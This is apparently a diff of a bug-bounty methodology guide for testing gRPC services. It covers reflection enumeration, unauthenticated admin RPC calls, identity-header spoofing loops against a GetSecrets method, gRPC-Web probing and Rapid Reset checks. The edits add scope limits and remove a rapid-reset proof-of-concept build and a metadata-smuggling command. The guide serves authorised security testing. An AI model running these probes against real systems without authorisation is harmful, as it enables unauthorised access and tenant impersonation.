@@ -36,7 +36,7 @@ report_count: 6
 gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is "internal" — auth is enforced at the edge proxy, and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses.
 
 **Highest-value findings:**
-- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).
+- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` may list registered services/descriptors, subject to reflection policy and registration. Enumeration enabler, not a vuln on its own (see Validation).
 - **Missing auth on internal service** — a service designed for east-west microservice traffic exposed externally with no mTLS and no per-method authorization → call privileged methods directly.
 - **Edge-auth-only / metadata-stripping** — proxy authenticates the user but the backend re-trusts proxy-injected headers (`x-user-id`, `x-tenant-id`, `x-forwarded-*`); if you reach the backend or can inject those headers via the proxy, you impersonate any tenant.
 - **Plaintext gRPC** — gRPC h2c (cleartext HTTP/2) on a non-standard port → credential/metadata interception.
@@ -44,13 +44,23 @@ gRPC reflection enabled = full service catalog enumeration without source code. 
 
 ---
 
+## Scope and protocol boundaries
+
+Use only the approved hosts/ports and two controlled test identities; never iterate
+real users or request secrets as a default proof. Bound requests, time, concurrent
+streams and response bytes; redact metadata/tokens and keep TLS validation enabled.
+The examples contain historical tool-shape commands requiring selected-version
+help/schema checks, not validated invocations. HTTP status/ALPN/content type do not
+alone prove valid gRPC framing. Backend/proxy/Connect routes have independent auth
+contracts; no arbitrary header name or -bin suffix automatically changes identity.
+
 ## Phase 1 — Fingerprint & Port Discovery
 
 ```bash
 # Common gRPC ports (50051 native; 443/8443 via TLS+ALPN h2; 9090/8080 h2c)
 nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET 2>/dev/null | grep open
 
-# ALPN must negotiate h2 — gRPC cannot run on HTTP/1.1
+# ALPN must negotiate h2 — native gRPC normally requires HTTP/2; gRPC-Web/Connect can use other HTTP versions
 echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"
 
 # Native-gRPC fingerprint: an HTTP/2 POST to a bogus method returns a grpc-status
@@ -70,11 +80,12 @@ curl -s --http2 -X POST "https://$TARGET/grpc.health.v1.Health/Check" \
 ## Phase 2 — Service Enumeration via Reflection
 
 ```bash
-brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
+# Use an already reviewed grpcurl version; installation needs the project dependency plan.
 
-# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
+# Use TLS verification by default; an approved private CA uses -cacert.
+# -plaintext is only for explicitly authorized cleartext lab endpoints.
 grpcurl -plaintext $TARGET:50051 list
-grpcurl -insecure  $TARGET:443   list
+grpcurl -max-time 15 -cacert /approved/test-ca.pem "$TARGET:443" list
 
 # Typical output when reflection is on:
 #   grpc.reflection.v1.ServerReflection
@@ -106,17 +117,17 @@ grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grp
 grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers
 
 # IDOR across an enumerable id field
-for ID in 1 2 3 100 1000 1001; do
+for ID in "$CONTROLLED_USER_A_ID" "$CONTROLLED_USER_B_ID"; do
   echo "id=$ID"; grpcurl -plaintext $TARGET:50051 \
     -d "{\"user_id\": $ID}" user.UserService/GetUser 2>&1 | head -4
 done
 ```
 
 **Interpret the gRPC status code, not just whether bytes came back (see Validation):**
-- `OK` + populated response → method executed unauthenticated → finding.
-- `Unauthenticated (16)` / `PermissionDenied (7)` → authz is enforced; NOT a finding.
+- `OK` + populated response → completed RPC; a finding still requires private data/action beyond the caller's authority.
+- `Unauthenticated (16)` / `PermissionDenied (7)` → this request was denied; this does not certify every path or method.
 - `Unimplemented (12)` → wrong path / method not on this server.
-- `InvalidArgument (3)` → reached and parsed your input → method is callable; fix the payload and retry.
+- `InvalidArgument (3)` → validation error; it does not prove authentication/authorization was bypassed.
 
 ---
 
@@ -138,10 +149,9 @@ for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
   grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3
 done
 
-# (c) Binary metadata smuggling — keys ending in -bin are base64-decoded by the
-#     server; some auth middlewares only inspect text metadata, missing -bin keys.
-grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \
-  -d '{}' admin.AdminService/GetConfig
+# Binary metadata is application-defined. A -bin key does not automatically bypass
+# auth; inspect the actual handler contract before using a synthetic test value.
+
 ```
 
 The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** — if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port.
@@ -193,10 +203,8 @@ curl -s "https://$TARGET/user.UserService/GetUser" \
   -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
   --data-binary @frame.bin | xxd | head
 
-# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
-curl -s "https://$TARGET/user.UserService/GetUser" \
-  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
-  -d '{"user_id": 1}'
+# gRPC-Web carries framed messages/trailers; do not send raw JSON with a made-up
+# grpc-web+json content type. Use a compatible generated client and actual schema.
 
 # (d) Connect protocol (buf): plain JSON POST, unary, no framing:
 curl -s "https://$TARGET/user.UserService/GetUser" \
@@ -214,30 +222,13 @@ Why this matters: the browser-facing transcoder commonly forwards to the SAME ba
 
 The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it — the client races far ahead of the concurrency cap. `h2load`/`ghz` are throughput benchmarkers; **they have no rapid-reset mode and never interleave HEADERS+immediate-RST_STREAM, so they cannot test this.**
 
-**Correct tooling — author-sanctioned PoCs that actually emit the frame pattern:**
-```bash
-# CERT/CC + community tracking and PoCs for CVE-2023-44487:
-#   https://kb.cert.org/vuls/id/421644
-#   https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/  (Cloudflare writeup)
-# Go PoC that sends HEADERS then immediate RST_STREAM in a tight loop:
-git clone https://github.com/secengjeff/rapidresetclient
-cd rapidresetclient && go build -o rapidreset .
-# Detection-only: a SHORT, low-count burst, with permission, then STOP:
-./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:
-# ./rapidreset -url https://$TARGET:443 -concurrency 1 -requests 20
-
-# If you must roll your own, use the h2 framing layer (golang.org/x/net/http2)
-# to write a HEADERS frame immediately followed by RST_STREAM(CANCEL) per stream id.
-```
-
-**Detection without DoSing — prefer this:** the only thing you need to PROVE is whether mitigations are present. Check the server banner / version and whether it tracks reset floods:
-```bash
-# Fingerprint the HTTP/2 implementation and version (patched versions are known):
-curl -sI --http2 https://$TARGET/ | grep -i '^server:'
-# nghttp2 >=1.57.0, Go net/http with the 2023-10 fix, Envoy >=1.27.1/1.26.5/1.25.10/1.24.11,
-# grpc-go >=1.56.3/1.57.1/1.58.3 are mitigated. Version-match instead of flooding.
-```
-Report the *version-confirmed* mitigation gap rather than a benchmark slowdown. "Server got slower under load" is not proof of CVE-2023-44487 — it produces false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully.
+Prefer owner-supplied package/configuration evidence and the relevant vendor's
+security advisory. A Server banner can be stripped, spoofed or backported; it is
+an applicability lead, not proof of an unpatched reset-handling implementation.
+Do not label a fixed small burst “detection-only” or safe: any reset flood can be
+disruptive. A separately approved isolated load test needs explicit stop thresholds,
+monitoring and rollback. No PoC download/build or exploit invocation is required
+for this read-only triage workflow, and no third-party PoC is certified here.
 
 ---
 
@@ -275,19 +266,19 @@ Related skills: **hunt-idor** (id enumeration logic), **hunt-api-misconfig** (JW
 
 gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.
 
-1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.
+1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` establish only that the tested request was denied. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.
 
-2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.
+2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, an observation that may be intentional and non-reportable — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.
 
 3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).
 
 4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.
 
-5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **hunt-ssrf**.
+5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction is inconclusive; egress, validation, DNS/proxy behavior can block a callback. Hand off to **hunt-ssrf**.
 
-6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.
+6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Use owner-confirmed build/configuration evidence or a controlled isolated test ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.
 
-**Severity guide (after the gates above pass):**
+**Illustrative severity possibilities; assess actual privileges, scope and impact:**
 - Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
 - Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
 - IDOR / mass PII via enumerable RPC → **High**
